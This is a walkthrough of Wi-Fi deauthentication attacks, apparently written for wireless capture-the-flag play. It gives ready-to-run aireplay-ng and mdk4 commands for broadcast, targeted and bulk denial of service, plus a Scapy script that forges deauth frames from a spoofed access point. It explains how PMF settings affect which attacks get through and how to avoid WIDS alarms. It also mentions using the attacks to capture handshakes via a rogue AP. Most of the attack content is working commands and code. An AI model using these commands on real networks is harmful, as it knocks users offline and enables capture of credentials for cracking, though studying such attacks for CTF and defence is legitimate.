# Deauth — walkthrough

Three flavors. Broadcast is loud and blocked by PMF; targeted is quiet
and works against non-PMF clients on a PMF-required AP (transition
mode); crafted-scapy is the fallback when the tool ergonomics fight you.

## Path A — Broadcast (works on legacy / unprotected)

```
# All clients on the AP, 10 rounds.
aireplay-ng -0 10 -a AA:BB:CC:DD:EE:FF wlan1mon
```

- Reason code: `7` (Class 3 frame from nonassociated STA).
- Blocked by PMF-required.
- Trips loud WIDS signatures instantly.

## Path B — Targeted (works against non-PMF clients)

The stealthier version. Send only to a specific client's MAC.

```
aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan1mon
```

- Still triggers a WIDS with per-STA-rate alerts, but low volume.
- Works even on PMF-required APs if the specific *client* opted out
  of PMF (allowed in transition mode).

## Path C — Scapy crafted

When you need control — different reason codes, spoofed BSSIDs, exotic
frame construction.

```python
from scapy.all import *

dot11 = Dot11(
    type=0, subtype=12,             # mgmt, deauth
    addr1="11:22:33:44:55:66",      # target STA
    addr2="AA:BB:CC:DD:EE:FF",      # spoofed AP
    addr3="AA:BB:CC:DD:EE:FF",      # BSSID
) / Dot11Deauth(reason=7)

# Send from a monitor+inject iface
for _ in range(5):
    sendp(RadioTap()/dot11, iface="wlan1mon", verbose=False)
```

Reason 15 (4-way handshake timeout) is sometimes more effective — some
supplicants restart the whole association on 15 but only retransmit
M-of-4 on 7.

## Path D — mdk4 modes (bulk DoS)

```
mdk4 wlan1mon d -B AA:BB:CC:DD:EE:FF          # deauth
mdk4 wlan1mon d -c 6 -B AA:BB:CC:DD:EE:FF     # channel-locked
mdk4 wlan1mon d -w /root/whitelist.txt        # deauth everyone except whitelist
```

## PMF interaction — what actually gets through

| AP posture              | Broadcast deauth | Targeted deauth (non-PMF client) | Targeted deauth (PMF client) |
| ----------------------- | ---------------- | -------------------------------- | ---------------------------- |
| PMF-disabled            | works            | works                            | n/a                          |
| PMF-optional (MFPC=1)   | works            | works                            | dropped                      |
| PMF-required (MFPR=1)   | dropped          | works (transition mode client)   | dropped                      |

The "works even on PMF-required" case is critical for WCTF: a
transition-mode AP with a mix of PMF and non-PMF clients still leaks
handshakes for the non-PMF clients.

## What if deauth doesn't fire?

- Confirm you're actually on the AP's channel. Deauth from a
  different channel is a common mistake.
- Confirm your radio is in monitor+inject mode: `iw dev wlan1mon info`
  should show `type monitor`.
- Confirm injection works: `aireplay-ng --test wlan1mon`.
- Confirm reason code isn't being silently mangled by a firmware bug
  (some Atheros firmwares mangle Dot11Deauth reason > 66).

## Failure modes

- **AP is PMF-required + all clients are PMF-capable.** Deauth is
  dead. Pivot to Kr00k trigger (disassoc still fires the tail-frame
  leak on Broadcom/Cypress), SSID Confusion, or wait for a natural
  reassoc.
- **WIDS alarms.** Broadcast deauth generates one alert per
  deauthed STA. Cut to targeted. Don't spam.
- **Client reconnects to another AP.** Deauth pushes them off; if
  they roam to a neighbor rather than reassoc to the same AP, you
  see the wrong handshake. Set your rogue up first.

## Cite

- IEEE Std 802.11-2020, §9.3.3.13, §9.4.1.7, §11.34.
- aircrack-ng documentation — aireplay-ng.
- mdk4 documentation.
- attacks.json: `deauth-targeted`, `deauth-broadcast`,
  `disassoc-targeted`.
